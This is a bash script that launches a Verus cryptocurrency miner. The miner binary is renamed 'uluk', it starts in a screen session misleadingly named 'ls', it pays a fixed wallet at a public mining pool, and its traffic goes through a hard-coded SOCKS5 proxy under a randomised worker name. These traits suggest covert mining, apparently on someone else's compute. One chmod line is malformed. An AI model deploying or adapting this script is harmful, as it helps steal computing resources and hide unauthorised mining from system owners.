#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x start.sh && chmod +x uluk chmod 777 uluk start.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RVDKJwu7n8mr6rr3qfeRREzknW6bbKQRHN
WORKER=$(echo $(shuf -i 1-5 -n 1)Long-RIG)
PROXY=socks5://98.178.72.21:10919
./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
